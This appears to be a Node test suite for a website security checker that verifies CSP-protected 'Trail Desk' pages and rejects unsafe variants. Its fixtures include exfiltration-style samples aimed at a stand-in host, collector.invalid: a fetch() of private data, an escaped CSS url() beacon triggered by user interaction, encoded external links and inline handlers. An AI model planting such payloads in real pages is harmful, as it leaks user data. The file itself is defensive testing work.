import assert from 'node:assert/strict';
import { createHash } from 'node:crypto';
import { readFile } from 'node:fs/promises';
import { after, before, test } from 'node:test';
import { resolve } from 'node:path';
import { pathToFileURL } from 'node:url';

const source = '../packages/security-review/checks/website-security.mjs';
const browserModule = process.env.FORGE_PLAYWRIGHT;
const hash = text => "'sha256-" + createHash('sha256').update(text).digest('base64') + "'";
const filter = `
const filter = document.querySelector("#step-free");
const trails = [...document.querySelectorAll("[data-trail]")];
const updateTrails = () => {
  for (const trail of trails) trail.hidden = filter.checked && trail.dataset.stepFree !== "true";
  document.querySelector("#count").textContent = trails.filter(trail => !trail.hidden).length + " trails";
};
filter.addEventListener("change", updateTrails); updateTrails();
`;
const filterControl = '<label><input id="step-free" type="checkbox"> Step-free only</label><strong id="count">1 trail</strong>';
const sort = `
(() => {
  const order = document.querySelector("#distance-sort");
  const catalog = document.querySelector(".grid");
  const cards = [...catalog.querySelectorAll("[data-trail]")];
  const distance = card => Number(card.dataset.distanceKm);
  order.addEventListener("change", () => {
    const ordered = [...cards];
    if (order.value === "shortest") ordered.sort((left, right) => distance(left) - distance(right));
    if (order.value === "longest") ordered.sort((left, right) => distance(right) - distance(left));
    catalog.append(...ordered);
  });
})();
`;
const sortControl = '<label>Sort by distance <select id="distance-sort"><option value="catalog">Catalog order</option>' +
  '<option value="shortest">Shortest first</option><option value="longest">Longest first</option></select></label>';

function website({ css = 'body{color:green}', scripts = [], markup = '', extraPolicy = '', policy = true } = {}) {
  const csp = [
    "default-src 'none'", "base-uri 'none'", "object-src 'none'", "form-action 'none'", "connect-src 'none'",
    'script-src ' + (scripts.length ? scripts.map(hash).join(' ') : "'none'"), 'style-src ' + hash(css) + extraPolicy,
  ].join('; ');
  return '<!doctype html><html lang="en"><head><meta charset="utf-8">' +
    (policy ? '<meta http-equiv="Content-Security-Policy" content="' + csp + '">' : '') +
    '<title>Trail Desk</title><style>' + css + '</style></head><body>' + markup +
    '<section class="grid"><article data-trail="short" data-step-free="true" data-distance-km="2"><h2>Short trail</h2></article></section>' +
    '<a href="architecture.json">Architecture</a>' +
    scripts.map(script => '<script>' + script + '</script>').join('') + '</body></html>';
}

let browser;
before(async () => {
  if (browserModule) {
    const { chromium } = await import(pathToFileURL(resolve(browserModule)).href);
    browser = await chromium.launch();
  }
});
after(() => browser?.close());

test('the security package exports an independent website checker', async () => {
  const { verifyWebsiteSecurity } = await import(source);
  assert.equal(typeof verifyWebsiteSecurity, 'function', 'missing website security verifier');
  const catalog = JSON.parse(await readFile(new URL('../packages/security-review/exports.json', import.meta.url)));
  assert.deepEqual(catalog, { version: 1, exports: [{ kind: 'checker', path: 'checks/website-security.mjs' }] });
});

function securityTest(name, run) {
  test(name, { skip: !browserModule && 'Set FORGE_PLAYWRIGHT to the Playwright module path' }, async () => {
    const { verifyWebsiteSecurity } = await import(source);
    await run(html => verifyWebsiteSecurity({ browser, html }));
  });
}

securityTest('approves the static page and the reviewed filter code with digest-bound evidence', async verify => {
  for (const [scripts, markup, scriptCount] of [[[], '', 0], [[filter], filterControl, 1], [[filter, sort], filterControl + sortControl, 2]]) {
    const html = Buffer.from(website({ scripts, markup }));
    const report = await verify(html);
    assert.equal(report.policy, 'trail-desk-static-v1');
    assert.equal(report.siteSha256, createHash('sha256').update(html).digest('hex'));
    assert.equal(report.scriptCount, scriptCount);
    assert.deepEqual(await verify(html), report);
  }
});

for (const [name, html, reason] of [
  ['missing CSP', website({ policy: false }), /Content Security Policy/],
  ['duplicate CSP directive', website({ extraPolicy: "; script-src 'unsafe-inline'" }), /Content Security Policy/],
  ['unsafe style CSP', website({ extraPolicy: " 'unsafe-inline'" }), /Content Security Policy/],
  ['CSP after an active element', website().replace('<title>Trail Desk</title>', '')
    .replace(/(<meta http-equiv[^>]+>)(<style>.*?<\/style>)/, '$2$1'), /Content Security Policy/],
  ['inline event handler', website({ markup: '<button oNcLiCk="alert(1)">go</button>' }), /inline event handler/],
  ['external resource', website({ markup: '<img src="//collector.invalid/asset">' }), /element img/],
  ['unexpected same-origin script', website({ markup: '<script src="surprise.js"></script>' }), /attribute src/],
  ['encoded external destination', website({ markup: '<a href="&#x2f;&#x2f;collector.invalid/">go</a>' }), /link destination/],
  ['new code authorized by its own CSP', website({ scripts: ['fetch("https://collector.invalid/private")'] }), /unreviewed script/],
  ['duplicate execution of a reviewed script', website({ scripts: [filter, filter], markup: filterControl }), /duplicate reviewed script/],
  ['dormant external CSS resource', website({ css: '.never-matches{background-image:url(https://collector.invalid/dormant)}' }),
    /stylesheet contains a resource URL/],
]) {
  securityTest('rejects ' + name, async verify => {
    await assert.rejects(verify(html), reason);
  });
}

for (const [interaction, scripts, markup, selector] of [
  ['filter', [filter], filterControl, 'body:has(input:checked)'],
  ['filter and sort', [filter, sort], filterControl + sortControl, 'body:has(input:checked):has(option[value=longest]:checked)'],
]) {
  securityTest('detects an outbound CSS load during ' + interaction, async verify => {
    const html = website({ scripts, markup, css: selector + '{background-image:u\\72l(https://collector.invalid/check)}' });
    await assert.rejects(verify(html), {
      actual: [{ directive: 'img-src', disposition: 'enforce', uri: 'https://collector.invalid/check' }],
    });
  });
}
